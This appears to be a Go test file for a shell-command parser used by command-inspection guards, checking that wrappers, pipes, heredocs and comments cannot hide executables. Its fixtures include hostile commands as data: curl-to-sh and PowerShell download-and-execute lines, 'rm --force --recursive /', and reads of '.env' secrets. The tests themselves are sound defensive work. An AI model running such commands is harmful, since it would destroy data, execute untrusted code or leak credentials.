package shellwords

import (
	"context"
	"maps"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/muehz/agentics/hooks/go/internal/argv"
)

func TestEnvironmentEffectLoopPolling(t *testing.T) {
	const count = 4096
	assignments := strings.TrimSpace(strings.Repeat("ORDINARY=value ", count))
	for _, tc := range []struct {
		name, source, publication string
		depth                     int
	}{
		{"bare-assignments", assignments, "env -i bash -c '" + assignments + "'", 1},
		{"wrapper-assignments", assignments + " command -v printf", assignments + " command -v printf", 0},
		{"reset-projection", "env " + strings.Repeat("-u OTHER ", count) + "printf ok", "env " + strings.Repeat("-u OTHER ", count) + "printf ok", 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			baseline := 0
			if tc.name == "reset-projection" {
				probe := &callCancelContext{Context: context.Background()}
				effects := readWrapper(probe, "env", lexSegment(tc.source, POSIX).words, POSIX, 1).effects
				if len(effects) != count {
					t.Fatalf("reset fixture effects=%d", len(effects))
				}
				baseline = probe.calls
			}
			probe := &callCancelContext{Context: context.Background()}
			p := parser{ctx: probe, dialect: POSIX, environmentDepth: tc.depth}
			p.parseSegment(tc.source, POSIX, nil, true, Start, -1, 0, false, false, 0, 0)
			if probe.calls-baseline < count/256 {
				t.Fatalf("environment %s polling: total=%d other-loop=%d minimum-extra=%d", tc.name, probe.calls, baseline, count/256)
			}
			if len(p.result.EnvironmentEffects) != count {
				t.Fatalf("environment %s effects=%d", tc.name, len(p.result.EnvironmentEffects))
			}
			cancelAt := baseline + 4
			probe = &callCancelContext{Context: context.Background(), at: cancelAt}
			got := ParseContext(probe, tc.publication, POSIX)
			if probe.calls < cancelAt || len(got.Invocations) == 0 {
				t.Fatalf("environment %s cancellation checks=%d invocations=%d", tc.name, probe.calls, len(got.Invocations))
			}
			for _, inv := range got.Invocations {
				if inv.Inspectable || inv.Raw == "" || !inv.Reason.Canceled() {
					t.Fatalf("environment %s published canceled proof", tc.name)
				}
			}
		})
	}
	t.Run("env-words", func(t *testing.T) {
		words := lexSegment("env "+assignments+" printf ok", POSIX).words
		probe := &callCancelContext{Context: context.Background()}
		effects := readWrapper(probe, "env", words, POSIX, 1).effects
		if probe.calls < count/256 {
			t.Fatalf("environment words polling: got=%d minimum=%d", probe.calls, count/256)
		}
		if len(effects) != count {
			t.Fatalf("environment words effects=%d", len(effects))
		}
		probe = &callCancelContext{Context: context.Background(), at: 4}
		if got := readWrapper(probe, "env", words, POSIX, 1).effects; probe.calls < 4 || got != nil {
			t.Fatalf("environment words canceled effects=%d checks=%d", len(got), probe.calls)
		}
	})
}

func TestBashInspectionPrecision(t *testing.T) {
	for _, inv := range Parse("bash --help", PowerShell).Invocations {
		if inv.Inspection != NoInspection {
			t.Fatal("PowerShell borrowed Bash inspection")
		}
	}
	for _, source := range []string{"bash --version", "bash --help", "bash -n script.sh", "bash -n -- '.env'", "bash -n '*.sh'"} {
		parsed := Parse(source, POSIX)
		if len(parsed.Invocations) != 1 || !parsed.Invocations[0].Inspectable || parsed.Invocations[0].Inspection == NoInspection || parsed.Invocations[0].Raw != source {
			t.Fatalf("inspection evidence lost for %q: %#v", source, parsed)
		}
		inv := parsed.Invocations[0]
		if strings.Contains(source, "-n") && (inv.Inspection != BashSyntaxRead || inv.SyntaxOperand == nil || *inv.SyntaxOperand != inv.Words[len(inv.Words)-1]) {
			t.Fatalf("syntax operand lost: %#v", inv)
		}
	}
	for _, source := range []string{"sh --help", "BASH --help", "/bin/bash --help", "'bash' --help", "env bash --help", "bash +n script.sh", "bash -n", "bash -n -", "bash -n -c 'cat .env'", "bash -ln script.sh", "bash --help extra", "bash --version --help", "bash -n *.sh", `bash -n "."*`, `bash -n 'prefix'?.sh`, "bash -n ~/script.sh", "bash -n {one,two}", "bash -n $FILE", `bash -n "$(cat .env)"`, "bash -n <(cat .env)", "bash --help < .env"} {
		for _, inv := range Parse(source, POSIX).Invocations {
			if inv.Inspection != NoInspection {
				t.Errorf("unsupported inspection granted for %q", source)
			}
		}
	}
}

func TestBashInspectionCancelled(t *testing.T) {
	for _, suffix := range []string{"--help", "-n -- script.sh"} {
		t.Run(suffix, func(t *testing.T) {
			source := "bash" + strings.Repeat(" ", 6*64*1024) + suffix
			count := &literalPollingContext{Context: context.Background()}
			if !bashInspectionSource(count, source) {
				t.Fatal("normal source proof missing")
			}
			parsed := Parse(source, POSIX)
			if len(parsed.Invocations) != 1 || parsed.Invocations[0].Inspection == NoInspection {
				t.Fatal("normal inspection missing")
			}
			if count.checks < 6 {
				t.Fatalf("long classification did not poll: %d", count.checks)
			}
			for _, at := range []int{1, 4, 6} {
				ctx, cancel := context.WithCancel(context.Background())
				counter := &literalPollingContext{Context: ctx, cancelAt: at, cancel: cancel}
				got := ParseContext(counter, source, POSIX)
				cancel()
				if counter.checks < at || len(got.Invocations) != 1 || got.Invocations[0].Inspectable || got.Invocations[0].Inspection != NoInspection || got.Invocations[0].Raw != source {
					t.Fatalf("partial cancellation proof: checks=%d result=%#v", counter.checks, got)
				}
			}
		})
	}
}

func TestParseCancellationDiagnostic(t *testing.T) {
	for _, tc := range []struct {
		name, source string
		dialect      Dialect
	}{
		{"bash-metadata", "bash --help", POSIX},
		{"bash-syntax", "bash -n script.sh", POSIX},
		{"posix-synthetic", "", POSIX},
		{"posix-assignment", "X=value", POSIX},
		{"powershell-command", "Write-Output public", PowerShell},
		{"powershell-synthetic", "", PowerShell},
		{"powershell-child", `pwsh -Command 'Write-Output public'`, POSIX},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			cancel()
			got := ParseContext(ctx, tc.source, tc.dialect)
			if len(got.Invocations) == 0 {
				t.Fatal("cancellation discarded all invocation evidence")
			}
			for _, inv := range got.Invocations {
				want := "shell inspection canceled"
				if inv.Dialect == PowerShell {
					want = "PowerShell environment inspection canceled"
				}
				if inv.Reason.String() != want || inv.Inspectable || inv.Inspection != NoInspection || inv.SyntaxOperand != nil {
					t.Fatalf("cancellation = %#v; want revoked proof with reason %q", inv, want)
				}
			}
		})
	}
}

func TestInspectionProofPartial(t *testing.T) {
	for _, source := range []string{"bash --hel", "bash -n --", "bash -n 'unfinished", `bash -c "bash -c 'bash -c x'"`, "env env env env bash --help"} {
		got := Parse(source, POSIX)
		if len(got.Invocations) == 0 {
			t.Fatalf("source erased: %q", source)
		}
		for _, inv := range got.Invocations {
			if inv.Inspection != NoInspection {
				t.Fatalf("partial source granted proof: %#v", inv)
			}
		}
	}
	for _, source := range []string{`bash --help > >(kubectl apply -f prod.yaml)`, `bash --version < $(cat .env)`, `bash --help; kubectl apply -f prod.yaml`} {
		got := Parse(source, POSIX)
		found := false
		for _, inv := range got.Invocations {
			if len(inv.Words) != 0 && (inv.Words[0].Text == "kubectl" || inv.Words[0].Text == "cat") {
				found = true
			}
		}
		if !found {
			t.Fatalf("shell-side executable evidence erased: %q: %#v", source, got)
		}
	}
}

func TestEnvironmentResetEvidence(t *testing.T) {
	parsed := Parse(`env -i -u FIRST bash -c 'env --unset=SECOND git status; env -u THIRD git log'`, POSIX)
	if len(parsed.Invocations) != 2 {
		t.Fatalf("invocations=%d", len(parsed.Invocations))
	}
	for i, inv := range parsed.Invocations {
		resets := inv.EnvironmentResets
		if len(resets) != 3 || !resets[0].All || resets[0].Order != 1 || resets[1].Name.Text != "FIRST" || resets[1].Order != 2 || resets[0].Occurrence != resets[1].Occurrence || resets[2].Occurrence == resets[0].Occurrence {
			t.Fatalf("lost reset order or occurrence: %#v", resets)
		}
		want := "SECOND"
		if i == 1 {
			want = "THIRD"
		}
		if resets[2].Name.Text != want || resets[2].Dialect != POSIX {
			t.Fatalf("child reset=%#v", resets[2])
		}
	}
	if parsed.Invocations[0].EnvironmentResets[2].Occurrence == parsed.Invocations[1].EnvironmentResets[2].Occurrence {
		t.Fatal("sibling resets share occurrence")
	}
	dynamic := Parse(`env -u "$NAME" git status`, POSIX)
	if len(dynamic.Invocations) != 1 || len(dynamic.Invocations[0].EnvironmentResets) != 1 || dynamic.Invocations[0].EnvironmentResets[0].Name.Literal {
		t.Fatal("unresolved reset evidence lost")
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	for _, inv := range ParseContext(ctx, `env -i git status`, POSIX).Invocations {
		if inv.Inspectable {
			t.Fatal("canceled reset published as inspectable")
		}
	}
}

func TestEnvironmentEffectsWithoutInvocation(t *testing.T) {
	for _, command := range []string{`env -i bash -c ''`, `env -i command -v git`, `env -i pwsh -Command ""`} {
		t.Run(command, func(t *testing.T) {
			result := Parse(command, POSIX)
			if result.Invocations != nil {
				t.Fatal("invented an executable invocation")
			}
			if len(result.EnvironmentEffects) != 1 {
				t.Fatalf("effects=%#v", result.EnvironmentEffects)
			}
			effect := result.EnvironmentEffects[0]
			if effect.Kind != EnvironmentResetAll || effect.Occurrence == 0 || effect.Order != 1 || effect.Dialect != POSIX {
				t.Fatalf("lost reset provenance: %#v", effect)
			}
		})
	}
	result := Parse(`env GIT_CONFIG_GLOBAL='outer path' bash -c 'INNER=value'`, POSIX)
	if result.Invocations != nil || len(result.EnvironmentEffects) != 2 || len(result.BareAssignments) != 1 {
		t.Fatalf("lost orphan assignments: %#v", result)
	}
	outer, inner := result.EnvironmentEffects[0], result.EnvironmentEffects[1]
	if outer.Kind != EnvironmentAssignment || outer.Word.Text != "GIT_CONFIG_GLOBAL=outer path" || outer.Word.Raw != "GIT_CONFIG_GLOBAL='outer path'" || outer.Occurrence == 0 || outer.Order != 1 || outer.Dialect != POSIX {
		t.Fatalf("outer assignment=%#v", outer)
	}
	if inner.Kind != EnvironmentAssignment || inner.Word.Text != "INNER=value" || inner.Occurrence != 0 || inner.Order != 0 || inner.Dialect != POSIX {
		t.Fatalf("inner assignment=%#v", inner)
	}
	nested := Parse(`env -i A=outer bash -c 'env -u FIRST B=inner command -v git'`, POSIX)
	if nested.Invocations != nil || len(nested.EnvironmentEffects) != 4 {
		t.Fatalf("nested effects=%#v", nested)
	}
	effects := nested.EnvironmentEffects
	if effects[0].Kind != EnvironmentResetAll || effects[1].Kind != EnvironmentAssignment || effects[1].Word.Text != "A=outer" || effects[2].Kind != EnvironmentUnset || effects[2].Word.Text != "FIRST" || effects[3].Word.Text != "B=inner" {
		t.Fatalf("lost source order: %#v", effects)
	}
	if effects[0].Occurrence != effects[1].Occurrence || effects[2].Occurrence != effects[3].Occurrence || effects[0].Occurrence == effects[2].Occurrence || effects[3].Order != 3 {
		t.Fatalf("lost wrapper occurrence/order: %#v", effects)
	}
}

// TestWrappersAreShadowed requires every name the parser unwraps to be one a script may not redefine: a function of
// that name would run in place of the wrapper while the guards inspect the command it appears to wrap. The list is a
// literal copy of the wrapper set, so a label dropped from it fails here too, and so does a wrapper added to the
// table without it.
func TestWrappersAreShadowed(t *testing.T) {
	names := []string{"sh", "bash", "pwsh", "powershell", "env", "command", "nohup", "exec", "sudo", "time",
		"xargs", "timeout", "doas", "nice", "ionice", "stdbuf", "setsid", "flock"}
	for _, name := range names {
		if !isWrapper(name) {
			t.Errorf("%s: no longer a wrapper", name)
		}
		if !argv.Lookup(name).Shadow {
			t.Errorf("%s: a wrapper the vocabulary does not mark Shadow", name)
		}
	}
	keys := slices.Sorted(maps.Keys(wrappers))
	if want := slices.Sorted(slices.Values(names)); !slices.Equal(keys, want) {
		t.Errorf("wrapper table keys = %v, want %v", keys, want)
	}
}

func TestWrapperOccurrenceIdentity(t *testing.T) {
	separate := Parse(`bash -c 'curl URL' | bash -c 'cat'`, POSIX).Invocations
	if len(separate) != 2 || len(separate[0].WrapperIDs) != 1 || len(separate[1].WrapperIDs) != 1 || separate[0].WrapperIDs[0] == separate[1].WrapperIDs[0] {
		t.Fatalf("separate wrapper occurrences share identity: %#v", separate)
	}
	shared := Parse(`bash -c 'curl URL | env printf safe'`, POSIX).Invocations
	if len(shared) != 2 || len(shared[0].WrapperIDs) != 1 || len(shared[1].WrapperIDs) != 2 || shared[0].WrapperIDs[0] != shared[1].WrapperIDs[0] {
		t.Fatalf("shared wrapper ancestor lost identity: %#v", shared)
	}
}

func TestBareAssignmentsAreRecordedWithoutInvocation(t *testing.T) {
	result := Parse(`A=1 B='two words'; git status; C=3 git log`, POSIX)
	var bare []string
	for _, w := range result.BareAssignments {
		bare = append(bare, w.Text)
	}
	if !reflect.DeepEqual(bare, []string{"A=1", "B=two words"}) {
		t.Fatalf("bare assignments = %#v", result.BareAssignments)
	}
	if len(result.Invocations) != 2 || len(result.Invocations[0].Assignments) != 0 || len(result.Invocations[1].Assignments) != 1 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	nested := Parse(`bash -c 'D=4; true'`, POSIX)
	if len(nested.BareAssignments) != 1 || nested.BareAssignments[0].Text != "D=4" {
		t.Fatalf("nested bare assignments = %#v", nested.BareAssignments)
	}
	if prefixed := Parse(`E=5 git status`, POSIX); prefixed.BareAssignments != nil {
		t.Fatalf("prefix assignment recorded as bare: %#v", prefixed.BareAssignments)
	}
}

func TestConsumedPipeDoesNotReachLaterGroup(t *testing.T) {
	for _, separator := range []string{";", "&&", "||", "&"} {
		invocations := Parse("curl URL | cat "+separator+" (bash -c 'cat')", POSIX).Invocations
		if len(invocations) != 3 || invocations[2].PipelineInputEdge != 0 || invocations[2].PipelineInput {
			t.Errorf("%s retains consumed pipe: %#v", separator, invocations)
		}
	}
}

func TestParsePreservesReleaseguardExecutableContexts(t *testing.T) {
	tests := []struct {
		name    string
		command string
		dialect Dialect
		want    []string
	}{
		{"operators", "printf ready && kubectl apply; helm upgrade", POSIX, []string{"printf", "kubectl", "helm"}},
		{"control words", "if true; then kubectl apply; fi", POSIX, []string{"true", "kubectl", "fi"}},
		{"groups", "(kubectl apply); { helm upgrade; }", POSIX, []string{"kubectl", "helm"}},
		{"substitution", `result=$(printf ready; kubectl apply)`, POSIX, []string{"printf", "kubectl"}},
		{"parameter expansion", `echo ${HOME}/kubectl apply`, POSIX, []string{"echo"}},
		{"powershell path", `& 'C:\Program Files\kubectl\kubectl.exe' apply`, PowerShell, []string{`C:\Program Files\kubectl\kubectl.exe`}},
		{"continued line", "kubectl \\\n+ apply", POSIX, []string{"kubectl"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result := Parse(tc.command, tc.dialect)
			var got []string
			for _, invocation := range result.Invocations {
				if len(invocation.Words) > 0 {
					got = append(got, invocation.Words[0].Text)
				}
			}
			if strings.Join(got, "|") != strings.Join(tc.want, "|") {
				t.Fatalf("executables = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestQuotedExecutableAndInertDataKeepProvenance(t *testing.T) {
	result := Parse(`"kubectl" apply; printf '%s\n' 'note; helm upgrade'`, POSIX)
	if len(result.Invocations) != 2 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	if got := result.Invocations[0].Words[0]; got.Text != "kubectl" || !got.Quoted || !got.Literal {
		t.Fatalf("quoted executable = %#v", got)
	}
	if got := result.Invocations[1].Words[2]; got.Text != "note; helm upgrade" || !got.Quoted || !got.Literal {
		t.Fatalf("inert argument = %#v", got)
	}
}

func TestInputRedirectionsAndAssignmentsAreStructured(t *testing.T) {
	result := Parse(`PGPASSFILE=/secure/pgpass env KUBECONFIG='/secure/kube config' cat 0<".env" 2>errors`, POSIX)
	if len(result.Invocations) != 1 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	invocation := result.Invocations[0]
	if len(invocation.Assignments) != 2 || invocation.Assignments[0].Text != "PGPASSFILE=/secure/pgpass" || invocation.Assignments[1].Text != "KUBECONFIG=/secure/kube config" {
		t.Fatalf("assignments = %#v", invocation.Assignments)
	}
	if len(invocation.InputRedirects) != 1 {
		t.Fatalf("input redirects = %#v", invocation.InputRedirects)
	}
	redirect := invocation.InputRedirects[0]
	if redirect.FD != 0 || redirect.Operator != "<" || redirect.Target.Text != ".env" || !redirect.Target.Quoted || !redirect.Target.Literal {
		t.Fatalf("redirect = %#v", redirect)
	}
}

func TestDataRedirectionOperandsAreNotFileReads(t *testing.T) {
	for _, command := range []string{
		"cat <<'.env'\nsynthetic data\n.env",
		"cat <<< '.env'",
	} {
		t.Run(command, func(t *testing.T) {
			result := Parse(command, POSIX)
			if len(result.Invocations) != 1 {
				t.Fatalf("invocations = %#v, want only cat", result.Invocations)
			}
			invocation := result.Invocations[0]
			if !invocation.Inspectable || len(invocation.Words) != 1 || len(invocation.InputRedirects) != 0 {
				t.Fatalf("data operand leaked into executable or file-read arguments: %#v", invocation)
			}
		})
	}
}

func TestDynamicWordsAreNotLiteral(t *testing.T) {
	result := Parse(`PGPASSFILE="$HOME/.pgpass" "$KUBECTL" apply`, POSIX)
	if len(result.Invocations) != 1 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	if result.Invocations[0].Assignments[0].Literal {
		t.Fatal("dynamic assignment marked literal")
	}
	if result.Invocations[0].Words[0].Literal {
		t.Fatal("dynamic executable marked literal")
	}
}

func TestPipeAndPowerShellGroupRelations(t *testing.T) {
	result := Parse(`curl https://example.invalid/payload | sh`, POSIX)
	if len(result.Invocations) != 2 || result.Invocations[1].Before != Pipe {
		t.Fatalf("pipe result = %#v", result)
	}

	result = Parse(`Invoke-Expression (Invoke-WebRequest https://example.invalid/payload).Content`, PowerShell)
	if len(result.Invocations) < 2 {
		t.Fatalf("group result = %#v", result)
	}
	if result.Invocations[1].Before != Group || result.Invocations[1].Parent != 0 {
		t.Fatalf("group child = %#v", result.Invocations[1])
	}
	if got := strings.ToLower(ExecutableName(result.Invocations[1].Words[0].Text)); got != "invoke-webrequest" {
		t.Fatalf("group child executable = %q", got)
	}

	result = Parse(`Invoke-Expression; (Invoke-WebRequest https://example.invalid/payload).Content`, PowerShell)
	if len(result.Invocations) < 2 || result.Invocations[1].Parent != -1 {
		t.Fatalf("separated group unexpectedly parented: %#v", result)
	}
}

func TestShellCommentsEndExecutionLine(t *testing.T) {
	for _, tc := range []struct {
		name, command string
		want          []string
	}{
		{"comment removes pipe recipient", "curl https://example.invalid #note | bash", []string{"curl"}},
		{"continued pipe keeps recipient edge", "curl https://example.invalid |\n bash", []string{"curl", "bash"}},
		{"comment after pipe keeps recipient edge", "curl https://example.invalid | #note\n bash", []string{"curl", "bash"}},
		{"substitution comment is inert", "echo $(#note\nprintf safe)", []string{"echo", "printf"}},
		{"quoted hash remains data", `printf '%s' '#note'`, []string{"printf"}},
		{"escaped hash remains data", "printf %s \\#note", []string{"printf"}},
		{"comment leaves following line", "printf safe #note\nprintf done", []string{"printf", "printf"}},
		{"escaped space hash keeps command tail", "printf safe\\ #not-comment; rm --force --recursive /", []string{"printf", "rm"}},
		{"escaped newline hash keeps command tail", "printf safe\\\n#not-comment\nrm --force --recursive /", []string{"printf", "rm"}},
		{"escaped operator hash keeps command tail", "printf safe\\|#not-comment; rm --force --recursive /", []string{"printf", "rm"}},
		{"plain hash inside word remains data", "printf foo#not-comment; rm --force --recursive /", []string{"printf", "rm"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result := Parse(tc.command, POSIX)
			var got []string
			for _, invocation := range result.Invocations {
				if len(invocation.Words) > 0 {
					got = append(got, invocation.Words[0].Text)
				}
			}
			if strings.Join(got, "|") != strings.Join(tc.want, "|") {
				t.Fatalf("executables = %q, want %q; invocations = %#v", got, tc.want, result.Invocations)
			}
			if tc.name == "continued pipe keeps recipient edge" || tc.name == "comment after pipe keeps recipient edge" {
				if len(result.Invocations) != 2 || result.Invocations[1].Before != Pipe || result.Invocations[1].Parent != result.Invocations[0].Parent {
					t.Fatalf("pipeline edge = %#v, want second invocation Before=Pipe with producer parent", result.Invocations)
				}
			}
		})
	}
}

// TestHashAfterClosedSubstitutionKeepsCommandTail pins the shell's word rule
// for a hash that follows a closed substitution: `$(x)#y` and “ `x`#y “ are
// one word, so the hash is data and the commands after the word stay
// inspectable. A hash after a closed group is a comment, as in the shell.
func TestHashAfterClosedSubstitutionKeepsCommandTail(t *testing.T) {
	for _, tc := range []struct {
		name, command string
		wantTail      bool
	}{
		{"quoted backtick", "echo \"$(`echo`#)\"; rm --force --recursive /", true},
		{"quoted nested substitution", "echo \"$(echo $(x)#)\"; rm --force --recursive /", true},
		{"unquoted backtick", "echo $(`echo`#); rm --force --recursive /", true},
		{"unquoted substitution", "echo $(echo x)#note; rm --force --recursive /", true},
		{"process substitution", "cat <(echo x)#note; rm --force --recursive /", true},
		{"group hash is a comment", "(echo x)#note; rm --force --recursive /", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result := Parse(tc.command, POSIX)
			var got []string
			gotTail := false
			for _, invocation := range result.Invocations {
				if len(invocation.Words) > 0 {
					got = append(got, invocation.Words[0].Text)
					if invocation.Words[0].Text == "rm" && invocation.Inspectable {
						gotTail = true
					}
				}
				if !invocation.Inspectable {
					t.Fatalf("uninspectable invocation %q: %s", invocation.Raw, invocation.Reason)
				}
			}
			if gotTail != tc.wantTail {
				t.Fatalf("rm inspectable = %v, want %v; executables = %q", gotTail, tc.wantTail, got)
			}
		})
	}
}

func TestPipelineGroupMetadataSeparatesSubstitutions(t *testing.T) {
	recipient := Parse("curl URL | (printf safe; bash -c 'source /dev/stdin')", POSIX).Invocations
	if len(recipient) != 3 || !recipient[0].PipelineOutput || !recipient[1].PipelineInput || !recipient[2].PipelineInput || recipient[0].PipelineOutputEdge == 0 || recipient[1].PipelineInputEdge != recipient[0].PipelineOutputEdge || recipient[2].PipelineInputEdge != recipient[0].PipelineOutputEdge {
		t.Fatalf("group recipient metadata = %#v", recipient)
	}
	producer := Parse("(curl URL; printf safe) | bash -c 'source /dev/stdin'", POSIX).Invocations
	if len(producer) != 3 || !producer[0].PipelineOutput || !producer[1].PipelineOutput || producer[2].Before != Pipe || producer[0].PipelineOutputEdge == 0 || producer[1].PipelineOutputEdge != producer[0].PipelineOutputEdge || producer[2].PipelineInputEdge != producer[0].PipelineOutputEdge {
		t.Fatalf("group producer metadata = %#v", producer)
	}
	substitution := Parse("echo $(curl URL) | bash -c 'source /dev/stdin'", POSIX).Invocations
	if len(substitution) != 3 || substitution[1].PipelineInput || substitution[1].PipelineOutput || substitution[2].PipelineInput || substitution[2].PipelineOutput {
		t.Fatalf("substitution metadata = %#v", substitution)
	}
}

func TestPowerShellEscapedCommentBoundaries(t *testing.T) {
	for _, command := range []string{
		"Write-Output safe` #not-comment; Remove-Item -Recurse -Force /",
		"Write-Output safe`\n#not-comment\nRemove-Item -Recurse -Force /",
		"Write-Output safe`|#not-comment; Remove-Item -Recurse -Force /",
	} {
		result := Parse(command, PowerShell)
		if len(result.Invocations) != 2 || result.Invocations[0].Words[0].Text != "Write-Output" || result.Invocations[1].Words[0].Text != "Remove-Item" {
			t.Fatalf("PowerShell escaped comment boundary %q = %#v", command, result.Invocations)
		}
	}
}

func TestRedirectionDuplicationStaysWithInvocation(t *testing.T) {
	result := Parse("printf safe 2>&1 | cat", POSIX)
	if len(result.Invocations) != 2 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	if !result.Invocations[0].Inspectable || result.Invocations[0].Words[0].Text != "printf" {
		t.Fatalf("redirected invocation = %#v", result.Invocations[0])
	}
	if result.Invocations[1].Words[0].Text != "cat" || result.Invocations[1].Before != Pipe {
		t.Fatalf("pipe target = %#v", result.Invocations[1])
	}

	result = Parse("printf safe &> /tmp/log | cat", POSIX)
	if len(result.Invocations) != 2 || !result.Invocations[0].Inspectable || result.Invocations[0].Words[0].Text != "printf" {
		t.Fatalf("combined output redirection = %#v", result.Invocations)
	}
}

func TestProcessSubstitutionKeepsParentAndChildInvocations(t *testing.T) {
	for _, tc := range []struct {
		name, command, child string
	}{
		{"safe child", "cat <(printf safe)", "printf"},
		{"dangerous child", "cat <(rm -rf /)", "rm"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result := Parse(tc.command, POSIX)
			if len(result.Invocations) != 2 {
				t.Fatalf("invocations = %#v", result.Invocations)
			}
			if result.Invocations[0].Words[0].Text != "cat" || result.Invocations[1].Words[0].Text != tc.child {
				t.Fatalf("parent/child = %#v", result.Invocations)
			}
			if result.Invocations[1].Before != Group || result.Invocations[1].Parent != 0 {
				t.Fatalf("child relation = %#v", result.Invocations[1])
			}
		})
	}
}

func TestUnquotedActiveHeredocBodyRemainsInspectable(t *testing.T) {
	result := Parse("cat <<EOF\n$(printf active)\nEOF\n", POSIX)
	found := false
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "printf" {
			found = true
		}
	}
	if !found {
		t.Fatalf("active heredoc substitution disappeared: %#v", result)
	}

	result = Parse("cat <<'EOF'\n$(printf inert)\nEOF\n", POSIX)
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "printf" {
			t.Fatalf("quoted heredoc data became an invocation: %#v", result)
		}
	}
}

func TestMixedHeredocPreservesOnlyExecutableSubstitutions(t *testing.T) {
	result := Parse("cat <<EOF\nkubectl apply -f prod.yaml\n$(printf active)\nEOF\n", POSIX)
	for _, invocation := range result.Invocations {
		if len(invocation.Words) == 0 {
			continue
		}
		if invocation.Words[0].Text == "kubectl" {
			t.Fatalf("heredoc data became an executable invocation: %#v", result)
		}
	}
	found := false
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "printf" {
			found = true
		}
	}
	if !found {
		t.Fatalf("executable substitution disappeared: %#v", result)
	}
}

func TestMultilineHeredocSubstitutionKeepsParserState(t *testing.T) {
	result := Parse("cat <<EOF\n$(\nrm --force --recursive /\n)\nEOF\n", POSIX)
	found := false
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "rm" {
			found = true
		}
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "EOF" {
			t.Fatalf("heredoc delimiter became an invocation: %#v", result)
		}
	}
	if !found {
		t.Fatalf("multiline executable substitution disappeared: %#v", result)
	}
}

func TestHeredocSubstitutionIgnoresQuotedAndEscapedCloses(t *testing.T) {
	for _, body := range []string{"printf \\)\nrm --force --recursive /", "printf ')'\nrm --force --recursive /"} {
		result := Parse("cat <<EOF\n$(\n"+body+"\n)\nEOF\n", POSIX)
		found := false
		for _, invocation := range result.Invocations {
			if len(invocation.Words) > 0 && invocation.Words[0].Text == "rm" {
				found = true
			}
		}
		if !found {
			t.Fatalf("dangerous command after protected close was hidden for body %q: %#v", body, result)
		}
	}
	result := Parse("cat <<EOF\n$(\nprintf '\\)'\n)\nEOF\n", POSIX)
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "rm" {
			t.Fatalf("benign protected-close substitution unexpectedly found rm: %#v", result)
		}
	}
}

func TestHeredocSubstitutionHandlesNestedQuotesAndEscapes(t *testing.T) {
	result := Parse("cat <<EOF\n$(\nprintf \"$(date)\"\nrm --force --recursive /\n)\nEOF\n", POSIX)
	found := false
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "rm" {
			found = true
		}
	}
	if !found {
		t.Fatalf("nested substitution hid later deletion: %#v", result)
	}

	for _, command := range []string{
		"cat <<EOF\n\\$(rm --force --recursive /)\nEOF\n",
		"cat <<EOF\n\\`rm --force --recursive /\\`\nEOF\n",
	} {
		result := Parse(command, POSIX)
		for _, invocation := range result.Invocations {
			if len(invocation.Words) > 0 && invocation.Words[0].Text == "rm" {
				t.Fatalf("escaped top-level substitution became executable: %#v", result)
			}
		}
	}
}

func TestEmbeddedBracesStayInLiteralOptionWords(t *testing.T) {
	result := Parse(`kubectl get secrets --output=jsonpath={.items[*].data}`, POSIX)
	if len(result.Invocations) != 1 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	words := result.Invocations[0].Words
	if got := words[len(words)-1].Text; got != `--output=jsonpath={.items[*].data}` {
		t.Fatalf("output word = %q", got)
	}
}

func TestHeredocBodiesAreDataNotInvocations(t *testing.T) {
	result := Parse("cat >note <<'EOF'\nrm -rf /\nEOF\nprintf done\n", POSIX)
	if len(result.Invocations) != 2 {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	if result.Invocations[0].Words[0].Text != "cat" || result.Invocations[1].Words[0].Text != "printf" {
		t.Fatalf("invocations = %#v", result.Invocations)
	}
	for _, invocation := range result.Invocations {
		if len(invocation.Words) > 0 && invocation.Words[0].Text == "rm" {
			t.Fatal("heredoc data became an invocation")
		}
	}
}

func TestSupportedWrappersProduceEffectiveInvocation(t *testing.T) {
	tests := []struct {
		command  string
		dialect  Dialect
		wrappers int
		complete bool
	}{
		{`bash -lc 'kubectl apply -f prod.yaml' ignored positional`, POSIX, 1, true},
		{`pwsh -NoProfile -NonInteractive -Command 'kubectl apply -f prod.yaml'`, POSIX, 1, true},
		{`sudo -E -u root env -i FOO=1 -- command -- kubectl apply`, POSIX, 3, true},
		{`xargs -0 -n 1 -- kubectl apply -f`, POSIX, 1, false},
	}
	for _, tc := range tests {
		t.Run(tc.command, func(t *testing.T) {
			result := Parse(tc.command, tc.dialect)
			if len(result.Invocations) != 1 {
				t.Fatalf("invocations = %#v", result.Invocations)
			}
			invocation := result.Invocations[0]
			if !invocation.Inspectable || ExecutableName(invocation.Words[0].Text) != "kubectl" {
				t.Fatalf("invocation = %#v", invocation)
			}
			if len(invocation.Wrappers) != tc.wrappers || invocation.Complete != tc.complete {
				t.Fatalf("wrappers/complete = %#v/%v", invocation.Wrappers, invocation.Complete)
			}
		})
	}
}

func TestInspectionOnlyCommandProducesNoChild(t *testing.T) {
	if got := Parse(`command -v kubectl`, POSIX); len(got.Invocations) != 0 {
		t.Fatalf("invocations = %#v", got.Invocations)
	}
}

func TestUnsupportedAndOverDepthWrappersAreUninspectable(t *testing.T) {
	for _, command := range []string{
		`env -S 'kubectl apply'`,
